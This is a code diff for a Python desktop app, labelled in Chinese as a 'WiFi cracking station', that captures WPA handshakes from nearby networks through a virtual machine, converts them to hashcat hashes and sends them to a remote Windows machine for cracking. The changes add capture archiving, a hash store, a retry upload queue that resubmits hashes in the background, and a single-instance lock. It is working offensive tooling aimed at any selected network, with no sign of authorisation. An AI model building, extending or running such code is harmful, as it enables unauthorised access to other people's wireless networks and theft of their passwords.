@@ -10,7 +10,7 @@ mac_wifi_app_v2.py — 一選就跑
 """
 import tkinter as tk
 from tkinter import ttk
-import subprocess, threading, time, json, re, os, urllib.request, signal, queue
+import subprocess, threading, time, json, re, os, glob, urllib.request, signal, queue
 
 # ---------------- fixed paths (Mac side) ----------------
 QEMU_BIN = '/opt/homebrew/bin/qemu-system-aarch64'
@@ -36,6 +36,10 @@ BIND = ('mount --bind /proc /newroot/proc 2>/dev/null; '
         'mount --bind /dev /newroot/dev 2>/dev/null\n') if RUNNER_MODE else ''
 
 LOCAL_DIR = os.path.expanduser('~/MacCapture/captures')
+CAPSTORE  = os.path.expanduser('~/wifi_cracker/capstore')
+HASHSTORE = os.path.expanduser('~/wifi_cracker/hashstore')
+UQUEUE    = os.path.expanduser('~/wifi_cracker/upload_queue.json')
+APP_LOCK  = '/tmp/mac_wifi_app.lock'
 DEFAULT_WIP, DEFAULT_PORT, DEFAULT_DUR = '100.94.10.122', '8766', '45'
 
 # ---------------- dark theme ----------------
@@ -85,6 +89,7 @@ class App:
         else:
             threading.Thread(target=self._usb_vm_loop, daemon=True).start()
             threading.Thread(target=self._scan_loop, daemon=True).start()
+            threading.Thread(target=self._sync_loop, daemon=True).start()
             self._log('就緒。自動掃描中 — 在左邊選一台 Wi-Fi 就會自動開始。')
             threading.Thread(target=self._startup_vm, daemon=True).start()
         signal.signal(signal.SIGUSR1, self._lift)
@@ -431,7 +436,14 @@ class App:
                 tu, cu = '🔌 抓包網卡：✅ 已抓取', C_GREEN
                 tv, cv = '📶 掃描引擎：✅ 就緒', C_GREEN
             elif vm:
-                tu, cu = '🔌 抓包網卡：⚠️ 請拔插重掛', C_AMBER
+                holder = self._usb_holder()
+                if holder != getattr(self, '_last_holder', ''):
+                    self._last_holder = holder
+                    self._ev('usbdiag', 'holder=%r' % holder)
+                if holder:
+                    tu, cu = '🔌 抓包網卡：⚠️ 被 %s 佔用' % holder, C_RED
+                else:
+                    tu, cu = '🔌 抓包網卡：⚠️ 換個 USB 孔試試', C_AMBER
                 tv, cv = '📶 掃描引擎：✅ 就緒', C_GREEN
             elif usb:
                 tu, cu = '🔌 抓包網卡：✅ 已插入', C_GREEN
@@ -445,6 +457,22 @@ class App:
                 if self._stop.is_set():
                     return
                 time.sleep(1)
+
+    def _usb_holder(self):
+        try:
+            r = subprocess.run(['ioreg', '-r', '-c',
+                                'AppleUSBHostDeviceUserClient'],
+                               capture_output=True, timeout=30)
+            for ln in (r.stdout or b'').decode('utf-8', 'replace').splitlines():
+                m = re.search(r'-o (.+?)\s+<class AppleUSBHostDeviceUserClient',
+                              ln)
+                if m:
+                    name = m.group(1).strip()
+                    if 'qemu' not in name.lower():
+                        return name
+        except Exception:
+            pass
+        return ''
 
     def _check_usb(self):
         try:
@@ -901,7 +929,9 @@ CH + 'ifconfig wlan0 down 2>/dev/null\n' +
                        '2>&1 | tail -4\n' % (rnd, rnd) +
                   'echo "===HASH==="\n' +
                   CH + 'cat /tmp/scan_%d.22000 2>/dev/null\n' % rnd +
-                  'echo "===END==="\n')
+                  'echo "===END==="\n' +
+                  'echo "===RAWCOUNT==="\n' +
+                  CH + 'grep -cv "^#" /tmp/scan_%d.22000 2>/dev/null\n' % rnd)
         t0 = time.time()
         r = subprocess.run(VM_SSH.split() + ['sh', '-s'], input=script.encode(),
                            capture_output=True, timeout=dur + 150)
@@ -926,6 +956,18 @@ CH + 'ifconfig wlan0 down 2>/dev/null\n' +
             if in_hash and line.strip():
                 hash_lines.append(line.strip())
         self.hash_pool.update(hash_lines)
+        raw = -1
+        for i, line in enumerate(lines):
+            if '===RAWCOUNT===' in line and i + 1 < len(lines):
+                try:
+                    raw = int(lines[i + 1].strip())
+                except Exception:
+                    pass
+                break
+        self._ev('conv', 'round=%d raw=%d got=%d' % (rnd, raw, len(hash_lines)))
+        if raw > 0 and not hash_lines:
+            self._log('   ⚠️ 轉換有 %d 行但讀到 0 — 讀取路徑異常' % raw)
+        self._save_pcap(rnd, ssid, bssid)
         self._save_local(ssid, sorted(self.hash_pool))
         self.set_phase('conv', '本輪 %d hash（累計 %d）' % (len(hash_lines),
                         len(self.hash_pool)),
@@ -955,6 +997,8 @@ CH + 'ifconfig wlan0 down 2>/dev/null\n' +
         self._cap_streak = 0
         # ---- 3. post (Windows 決定: 秒回 / 自動解 / 掛起待確認) ----
         status, pw = self._post(self._target_lines(), ssid, bssid, wip, port)
+        if status is False:
+            self._enqueue_upload(ssid, bssid)
         if status == 'cracked':
             self.set_phase('done', '🎉 破解成功', pw)
             self._result('🎉  %s' % pw, C_GREEN)
@@ -1011,10 +1055,10 @@ CH + 'ifconfig wlan0 down 2>/dev/null\n' +
 
     def _save_local(self, ssid, lines):
         try:
-            os.makedirs(LOCAL_DIR, exist_ok=True)
+            os.makedirs(HASHSTORE, exist_ok=True)
             safe = re.sub(r'[^A-Za-z0-9._-]', '_', ssid) or 'wifi'
-            path = os.path.join(LOCAL_DIR, '%s_%s.22000' % (safe,
-                                        time.strftime('%Y-%m-%d')))
+            b = self.target[1].lower() if self.target else 'x'
+            path = os.path.join(HASHSTORE, '%s_%s.22000' % (safe, b))
             seen = set()
             if os.path.exists(path):
                 seen = set(l.strip() for l in open(path) if l.strip())
@@ -1025,6 +1069,118 @@ CH + 'ifconfig wlan0 down 2>/dev/null\n' +
                         f.write(l + '\n')
         except Exception as e:
             self._log('⚠️ 存本機: %r' % e)
+
+    def _save_pcap(self, rnd, ssid, bssid):
+        try:
+            os.makedirs(CAPSTORE, exist_ok=True)
+            p = '/newroot/tmp/scan_%d' % rnd if RUNNER_MODE else '/tmp/scan_%d' % rnd
+            r = subprocess.run(VM_SSH.split() + ['cat', p],
+                               capture_output=True, timeout=60)
+            data = r.stdout or b''
+            if len(data) < 100:
+                return
+            safe = re.sub(r'[^A-Za-z0-9._-]', '_', ssid) or 'wifi'
+            path = os.path.join(CAPSTORE, '%s_%s_%s.pcapng' % (
+                safe, bssid.lower(), time.strftime('%Y%m%d-%H%M%S')))
+            with open(path, 'wb') as f:
+                f.write(data)
+            self._ev('pcap', 'saved=%s bytes=%d' % (
+                os.path.basename(path), len(data)))
+            self._rotate_capstore()
+        except Exception as e:
+            self._ev('pcapfail', '%r' % e)
+
+    def _rotate_capstore(self):
+        try:
+            files = sorted(glob.glob(CAPSTORE + '/*.pcapng'),
+                           key=os.path.getmtime)
+            total = sum(os.path.getsize(x) for x in files)
+            for x in files:
+                if total <= 300 * 1024 * 1024:
+                    break
+                total -= os.path.getsize(x)
+                os.remove(x)
+        except Exception:
+            pass
+
+    def _load_queue(self):
+        try:
+            with open(UQUEUE) as f:
+                d = json.load(f)
+            return d if isinstance(d, dict) else {}
+        except Exception:
+            return {}
+
+    def _enqueue_upload(self, ssid, bssid):
+        try:
+            q = self._load_queue()
+            q[bssid.lower()] = {'ssid': ssid, 'bssid': bssid,
+                                'ts': time.strftime('%Y-%m-%d %H:%M:%S')}
+            tmp = UQUEUE + '.tmp'
+            with open(tmp, 'w') as f:
+                json.dump(q, f)
+            os.replace(tmp, UQUEUE)
+            self._ev('queue', 'enq=%s n=%d' % (bssid, len(q)))
+        except Exception as e:
+            self._ev('queuefail', '%r' % e)
+
+    def _hashstore_lines(self, ssid, bssid):
+        safe = re.sub(r'[^A-Za-z0-9._-]', '_', ssid) or 'wifi'
+        path = os.path.join(HASHSTORE, '%s_%s.22000' % (safe, bssid.lower()))
+        b = bssid.lower()
+        out = []
+        try:
+            for l in open(path):
+                l = l.strip()
+                if not l:
+                    continue
+                if b in l.lower():
+                    out.append(l)
+                elif l.startswith('WPA*01'):
+                    f = l.split('*')
+                    if len(f) >= 4 and f[2] == b:
+                        out.append(l)
+        except Exception:
+            pass
+        return out
+
+    def _sync_loop(self):
+        while not self._stop.is_set():
+            for _ in range(60):
+                if self._stop.is_set():
+                    return
+                time.sleep(1)
+            q = self._load_queue()
+            if not q:
+                continue
+            wip = self.var['wip'].get().strip() or DEFAULT_WIP
+            port = self.var['port'].get().strip() or DEFAULT_PORT
+            for key, ent in list(q.items()):
+                lines = self._hashstore_lines(ent['ssid'], ent['bssid'])
+                if not lines:
+                    q.pop(key, None)
+                    continue
+                status, pw = self._post(lines, ent['ssid'], ent['bssid'],
+                                        wip, port)
+                if status is False:
+                    break
+                q.pop(key, None)
+                if status == 'cracked':
+                    self._log('📡 補傳 %s → Windows 秒回: %s' % (
+                        ent['ssid'], pw))
+                    if self.target and self.target[1].lower() == key:
+                        self.set_phase('done', '🎉 補傳破解成功', pw)
+                        self._result('🎉  %s' % pw, C_GREEN)
+                else:
+                    self._log('📡 補傳 %s 已送達 Windows (%s)' % (
+                        ent['ssid'], status))
+            try:
+                tmp = UQUEUE + '.tmp'
+                with open(tmp, 'w') as f:
+                    json.dump(q, f)
+                os.replace(tmp, UQUEUE)
+            except Exception:
+                pass
 
     def _read_pot_pw(self, pot):
         try:
@@ -1200,10 +1356,41 @@ def _kill_other_instances():
     except Exception:
         pass
 
+def _acquire_lock():
+    import socket
+    for _ in range(2):
+        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+        try:
+            s.bind(APP_LOCK)
+            s.listen(1)
+            return s
+        except OSError:
+            try:
+                t = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+                t.settimeout(2)
+                t.connect(APP_LOCK)
+                t.close()
+                return None
+            except OSError:
+                try:
+                    os.unlink(APP_LOCK)
+                except Exception:
+                    pass
+    return None
+
 def main():
-    _kill_other_instances()
+    lock = _acquire_lock()
     root = tk.Tk()
+    if lock is None:
+        root.title('WiFi 破解台')
+        root.configure(bg=C_BG)
+        tk.Label(root, text='WiFi 破解台 已在執行中\n（直接用螢幕上那個視窗即可）',
+                 font=('PingFang TC', 16), bg=C_BG, fg=C_AMBER,
+                 padx=40, pady=30).pack()
+        root.mainloop()
+        return
     app = App(root)
+    app._lock = lock
     root.protocol('WM_DELETE_WINDOW', app.close)
     root.mainloop()
 
